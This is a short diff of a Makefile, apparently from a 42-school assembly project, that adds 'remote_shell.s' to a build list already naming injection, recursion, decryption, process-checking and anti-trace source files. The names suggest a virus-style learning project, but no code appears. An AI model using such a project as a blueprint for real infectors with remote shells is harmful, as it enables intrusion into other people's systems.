@@ -6,7 +6,7 @@
 #    By: t <t@student.42.fr>                        +#+  +:+       +#+         #
 #                                                 +#+#+#+#+#+   +#+            #
 #    Created: 2018/10/03 11:06:26 by yalabidi          #+#    #+#              #
-#    Updated: 2022/05/20 21:27:45 by t                ###   ########.fr        #
+#    Updated: 2022/06/16 21:16:17 by t                ###   ########.fr        #
 #                                                                              #
 # **************************************************************************** #
 
@@ -35,7 +35,7 @@ INC_PATH_ASM= -i srcs/ -i includes
 
 NAME_SRC_ASM=main.s
 
-SRC_LINK=append.s ft_strcpy.s ft_strlen.s injection.s main.s recursive.s get_processus_actif.s decrypt.s putnbr.s check_trace.s
+SRC_LINK=append.s ft_strcpy.s ft_strlen.s injection.s main.s recursive.s get_processus_actif.s decrypt.s putnbr.s check_trace.s remote_shell.s
 
 
 NAME_SRC_LINK = $(addprefix $(SRC_ASM_PATH)/,$(SRC_LINK))
